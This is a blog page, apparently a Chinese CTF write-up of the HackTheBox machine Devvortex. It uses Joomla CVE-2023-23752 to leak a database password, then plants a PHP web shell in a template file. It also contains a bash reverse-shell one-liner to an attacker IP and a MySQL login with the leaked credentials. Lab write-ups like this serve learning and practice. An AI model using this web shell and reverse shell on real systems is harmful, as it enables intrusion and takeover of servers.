@@ -1,0 +1,676 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+<!-- keywords -->
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Xu Haoxiang">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Xu Haoxiang">
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    <meta name="description" content="">
+    <meta name="description" content="真是忙里偷闲的日子呀 刷题记录 学到了一个不常见的CMS架构">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Devvortex">
+<meta property="og:url" content="http://dawoxiansigema.github.io/2025/09/15/Devvortex/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="真是忙里偷闲的日子呀 刷题记录 学到了一个不常见的CMS架构">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/09/15/Devvortex/1.png">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/09/15/Devvortex/2.png">
+<meta property="article:published_time" content="2025-09-15T15:35:23.000Z">
+<meta property="article:modified_time" content="2025-09-16T09:31:55.465Z">
+<meta property="article:author" content="Xu Haoxiang">
+<meta property="article:tag" content="HTB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://dawoxiansigema.github.io/2025/09/15/Devvortex/1.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    <title>Devvortex · Eur3ka&#39;s Studio</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .footer-fixed-btn,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(
+            -45deg,
+            #444 0,
+            #444 80px,
+            #333 80px,
+            #333 160px
+        );
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link id="stylesheet-fancybox" rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-base" rel="preload" href="/css/style.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-mobile" rel="preload" href="/css/mobile.css" as="style" onload="this.onload=null;this.rel='stylesheet';this.media='screen and (max-width: 960px)'">
+    <link id="stylesheet-theme-dark" rel="preload" href="/css/dark.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    <!-- 百度统计  -->
+    <!-- 谷歌统计  -->
+    <!-- Google tag (gtag.js) -->
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+        <body class="post-body">
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        <div class="header-sidebar-menu">
+            <div style="padding-left: 1px;">&#xe775;</div>
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href="/">Eur3ka's Studio.</a>
+        </span>
+    </div>
+    <!-- toggle banner -->
+    <div class="banner">
+        <div class="blog-title header-element">
+            <a href="/">Eur3ka&#39;s Studio.</a>
+        </div>
+        <div class="post-title header-element">
+            <a href="#" class="post-name">Devvortex</a>
+        </div>
+    </div>
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- donate button -->
+
+    <!-- back to top button -->
+    <div class="footer-fixed-btn footer-fixed-btn--hidden back-top">
+        <div>&#xe639;</div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="    height:50vh;
+">
+    <!-- 主页  -->
+    <!-- 404页  -->
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+                Devvortex
+            <!-- 404 -->
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            <!-- 404 -->
+        </p>
+        <!-- 文章页 meta -->
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                    <div class="post-intro-tags" >
+        <a class="post-tag" href="javascript:void(0);" data-tags="HTB">HTB</a>
+</div>
+
+                <!-- 文章字数统计 -->
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2025/09/15</span>
+                    <!-- busuanzi -->
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" alt="loading">
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <p>真是忙里偷闲的日子呀 刷题记录 学到了一个不常见的CMS架构</p>
+<span id="more"></span>
+
+<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>对于开放的端口而言 并没有太多值得需要关注的地方 又是网站服务80端口起手</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">❯ nmap -sCV -p22,80 10.10.11.242</span><br><span class="line">Starting Nmap 7.98 ( https://nmap.org ) at 2025-09-15 23:38 +0800</span><br><span class="line">Nmap scan report for devvortex.htb (10.10.11.242)</span><br><span class="line">Host is up (0.34s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)</span><br><span class="line">|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)</span><br><span class="line">|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: DevVortex</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 19.91 seconds</span><br></pre></td></tr></table></figure>
+
+<p>进入web服务之后 并不能找到合适的攻击点 下方的输入框也没有什么头绪 下一步还是HTB提供的思路去寻找子域名 也是学到了</p>
+<p><img src="/2025/09/15/Devvortex/1.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">❯ proxychains ffuf -w subdomains-1000.txt -u http://10.10.11.242 -H &#x27;Host: FUZZ.devvortex.htb&#x27;</span><br><span class="line">[proxychains] config file found: /Users/joe/proxychains-ng/proxychains.conf</span><br><span class="line">[proxychains] preloading /Users/joe/proxychains-ng/libproxychains4.dylib</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17-git-4-gce07eaa</span><br><span class="line"></span><br><span class="line">        /&#x27;___\  /&#x27;___\           /&#x27;___\</span><br><span class="line">       /\ \__/ /\ \__/  __  __  /\ \__/</span><br><span class="line">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span><br><span class="line">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span><br><span class="line">         \ \_\   \ \_\  \ \____/  \ \_\</span><br><span class="line">          \/_/    \/_/   \/___/    \/_/</span><br><span class="line"></span><br><span class="line">       v2.1.0-dev</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line"> :: Method           : GET</span><br><span class="line"> :: URL              : http://10.10.11.242</span><br><span class="line"> :: Wordlist         : FUZZ: /Users/joe/Documents/Red/SecDictionary/Subdomain_List/subdomains-1000.txt</span><br><span class="line"> :: Header           : Host: FUZZ.devvortex.htb</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 40</span><br><span class="line"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 601ms]</span><br></pre></td></tr></table></figure>
+
+<p>发现以dev开头的子域名 加入hosts以访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.242 devvortex.htb dev.devvortex.htb</span><br></pre></td></tr></table></figure>
+
+<p>成功访问之后发现页脚里和源代码里都没有写到对应的框架信息(至少我没找到) 遂使用CmsVulScan扫描一下框架信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">❯ python3 CmsVulScan.py -u http://dev.devvortex.htb</span><br><span class="line"></span><br><span class="line">  _____        _   __     ______</span><br><span class="line"> / ___/_ _  __| | / /_ __/ / __/______ ____</span><br><span class="line">/ /__/  &#x27; \(_-&lt; |/ / // / /\ \/ __/ _ `/ _ \</span><br><span class="line">\___/_/_/_/___/___/\_,_/_/___/\__/\_,_/_//_/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[00:22:07] [*] Check whether the payload file exists</span><br><span class="line">[00:22:07] [*] All Payload 18780 duplicate removal 6935</span><br><span class="line">[00:22:07] [+] Payload load the success</span><br><span class="line">[00:22:07] [*] CMS recognition of http://dev.devvortex.htb in progress</span><br><span class="line">[00:22:07] [*] Scanning by MD5 mode......</span><br><span class="line">[00:24:17] [*] MD5: 3725/3725</span><br><span class="line">[00:24:17] [*] Scanning by RE mode......</span><br><span class="line">[00:24:19] [*] RE: 49/2868</span><br><span class="line">[00:24:19] [+] Using RE to discover the CMS in path /administrator/components/com_login/login.xml: Joomla(逐浪)</span><br></pre></td></tr></table></figure>
+
+<p>确实是Joomla 那么接下来获取版本 直接访问&#x2F;administrator在页脚也没有看到版本信息 那么去msfconsole看下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search joomla</span><br><span class="line">14  auxiliary/scanner/http/joomla_version</span><br><span class="line">msf &gt; use auxiliary/scanner/http/joomla_version</span><br><span class="line">msf auxiliary(scanner/http/joomla_version) &gt; set rhosts http://dev.devvortex.htb/</span><br><span class="line">rhosts =&gt; http://dev.devvortex.htb/</span><br><span class="line">msf auxiliary(scanner/http/joomla_version) &gt; run</span><br><span class="line">[*] Server: nginx/1.18.0 (Ubuntu)</span><br><span class="line">[+] Joomla version: 4.2.6</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
+
+<p>成功获取该joomla版本为4.2.6</p>
+<h1 id="着手"><a href="#着手" class="headerlink" title="着手"></a>着手</h1><h2 id="CVE-2023-23752"><a href="#CVE-2023-23752" class="headerlink" title="CVE-2023-23752"></a>CVE-2023-23752</h2><p>既然知道了框架 那搜一下关于他的洞 发现没有4.2.6的 但是有个比他高一点的4.2.8 那就试一下好啦</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ searchsploit joomla | grep 4.2</span><br><span class="line">Joomla! v4.2.8 - Unauthenticated information disclosure             | php/webapps/51334.py</span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ searchsploit -x php/webapps/51334.py</span><br><span class="line"></span><br><span class="line">#!/usr/bin/env ruby</span><br><span class="line"></span><br><span class="line"># Exploit</span><br><span class="line">## Title: Joomla! v4.2.8 - Unauthenticated information disclosure</span><br><span class="line">## Exploit author: noraj (Alexandre ZANNI) for ACCEIS (https://www.acceis.fr)</span><br><span class="line">## Author website: https://pwn.by/noraj/</span><br><span class="line">## Exploit source: https://github.com/Acceis/exploit-CVE-2023-23752</span><br><span class="line">## Date: 2023-03-24</span><br><span class="line">## Vendor Homepage: https://www.joomla.org/</span><br><span class="line">## Software Link: https://downloads.joomla.org/cms/joomla4/4-2-7/Joomla_4-2-7-Stable-Full_Package.tar.gz?format=gz</span><br><span class="line">## Version: 4.0.0 &lt; 4.2.8 (it means from 4.0.0 up to 4.2.7)</span><br></pre></td></tr></table></figure>
+
+<p>发现确实是4.0.0到4.2.8都可以通用的漏洞 那么就用msfconsole着手吧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use cve:2023-23752</span><br><span class="line">msf auxiliary(scanner/http/joomla_api_improper_access_checks) &gt; set rhosts http://dev.devvortex.htb/</span><br><span class="line">rhosts =&gt; http://dev.devvortex.htb/</span><br><span class="line">msf auxiliary(scanner/http/joomla_api_improper_access_checks) &gt; run</span><br><span class="line">[+] Users JSON saved to /Users/joe/.msf4/loot/20250916125947_default_10.10.11.242_joomla.users_856850.bin</span><br><span class="line">[+] Joomla Users</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> ID   Super User  Name        Username  Email       Send Email  Register D  Last Visit   Group Names</span><br><span class="line">                                                                ate         Date</span><br><span class="line"> --   ----------  ----        --------  -----       ----------  ----------  -----------  -----------</span><br><span class="line"> 649  *           lewis       lewis     lewis@devv  1           2023-09-25  2023-10-29   Super Users</span><br><span class="line">                                        ortex.htb                16:44:24   16:18:50</span><br><span class="line"> 650              logan paul  logan     logan@devv  0           2023-09-26               Registered</span><br><span class="line">                                        ortex.htb                19:15:42</span><br><span class="line"></span><br><span class="line">[+] Config JSON saved to /Users/joe/.msf4/loot/20250916125948_default_10.10.11.242_joomla.config_972795.bin</span><br><span class="line">[+] Joomla Config</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line"> Setting        Value</span><br><span class="line"> -------        -----</span><br><span class="line"> db encryption  0</span><br><span class="line"> db host        localhost</span><br><span class="line"> db name        joomla</span><br><span class="line"> db password    P4ntherg0t1n5r3c0n##</span><br><span class="line"> db prefix      sd4fg_</span><br><span class="line"> db user        lewis</span><br><span class="line"> dbtype         mysqli</span><br></pre></td></tr></table></figure>
+
+<p>可以正常打通获取信息 就是不知道为什么下面还是接了一连串的报错 尝试直接连接数据库发现是连不上的 可能没有开启远程连接 好在可以复用为登陆账号密码</p>
+<h2 id="Templates修改"><a href="#Templates修改" class="headerlink" title="Templates修改"></a>Templates修改</h2><p><img src="/2025/09/15/Devvortex/2.png"></p>
+<p>进来之后一把梭的CVE应该是再没了 后来也是学习了一下joomla框架 发现System&#x2F;Templates&#x2F;Site Templates里面可以编辑框架模版 并且是实时更新的 那么看看能不能给他加点啥</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @package     Joomla.Site</span><br><span class="line"> * @subpackage  Templates.cassiopeia</span><br><span class="line"> *</span><br><span class="line"> * @copyright   (C) 2017 Open Source Matters, Inc. &lt;https://www.joomla.org&gt;</span><br><span class="line"> * @license     GNU General Public License version 2 or later; see LICENSE.txt</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">defined(&#x27;_JEXEC&#x27;) or die;</span><br><span class="line"></span><br><span class="line">if (isset($_REQUEST[&#x27;hack&#x27;]))&#123;</span><br><span class="line">  system($_REQUEST[&#x27;hack&#x27;]);</span><br><span class="line">  die();</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>对index.php我们因为权限并不能修改 但是发现了error.php这个漏网之鱼 修改之后弹个shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://dev.devvortex.htb/hack?hack=bash -c &quot;bash -i &gt;%26 /dev/tcp/10.10.16.2/4444 0&gt;%261&quot;</span><br><span class="line"></span><br><span class="line">❯ nc -lvn 4444</span><br><span class="line">bash: cannot set terminal process group (871): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">www-data@devvortex:~/dev.devvortex.htb$ python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">&lt;tb$ python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">www-data@devvortex:~/dev.devvortex.htb$</span><br><span class="line">//连接后使用python升级shell</span><br></pre></td></tr></table></figure>
+
+<h1 id="logan登陆"><a href="#logan登陆" class="headerlink" title="logan登陆"></a>logan登陆</h1><h2 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a>Hashcat</h2><p>连接之后发现home下只有logan用户 尝试使用之前的lewis&#x2F;P4ntherg0t1n5r3c0n##用户密码无法ssh连接 后来想起来之前的数据库还没有连接过 尝试使用mysql连接数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@devvortex:~/dev.devvortex.htb$ mysql -u lewis -p&#x27;P4ntherg0t1n5r3c0n##&#x27; joomla</span><br><span class="line">&lt;htb$ mysql -u lewis -p&#x27;P4ntherg0t1n5r3c0n##&#x27; joomla</span><br><span class="line">...</span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>
+
+<p>ok成功连接上 就不开远程连接了 直接干terminal好了</p>
